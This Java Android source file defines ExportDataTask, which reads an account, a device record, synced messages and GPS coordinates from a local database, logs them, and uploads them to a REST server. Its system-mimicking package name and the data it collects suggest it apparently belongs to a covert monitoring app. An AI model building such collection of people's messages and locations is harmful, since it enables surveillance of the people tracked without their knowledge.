package android.service.app.rest;

import android.annotation.TargetApi;
import android.content.Context;
import android.os.Build;
import android.service.app.db.DatabaseHelper;
import android.service.app.db.data.Gps;
import android.service.app.db.data.Message;
import android.service.app.db.inventory.Device;
import android.service.app.db.user.Account;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.Log;

import java.util.Set;

@TargetApi(Build.VERSION_CODES.CUPCAKE)
public class ExportDataTask<Input> extends GenericDataTask<Input>
{
    public ExportDataTask(DatabaseHelper localDatabase, Context context, CallbackHandler<SyncOutput> handler)
    {
        super(localDatabase, context, handler);
    }

    @SafeVarargs
    protected final SyncOutput doInBackground(Input... voids)
    {
        try
        {
            Account account = localDatabase.wrapForRead(DatabaseHelper.ACCOUNT).getFirst();
            Device device = localDatabase.wrapForRead(DatabaseHelper.DEVICE).getFirst();
            Set<Message> actualMessagesBySync = localDatabase.wrapForRead(DatabaseHelper.MESSAGE).getActualBySync();
            Set<Gps> actualCoordinatesBySync = localDatabase.wrapForRead(DatabaseHelper.GPS).getActualBySync();

            if (Log.isInfoEnabled()) Log.info("account=" + account);
            if (Log.isInfoEnabled()) Log.info("device=" + device);
            if (Log.isInfoEnabled()) Log.info("actualMessagesBySync=" + actualMessagesBySync);
            if (Log.isInfoEnabled()) Log.info("actualCoordinatesBySync=" + actualCoordinatesBySync);

            restBridge.postAccount(account);
            restBridge.postDevice(device);
            restBridge.postMessages(actualMessagesBySync);
            restBridge.postGps(actualCoordinatesBySync);
        } catch (Exception e)
        {
            AndroidUtils.handleExceptionWithoutThrow(e);
            return new SyncOutput(e);
        }

        return buildSuccessSyncOutput();
    }
}
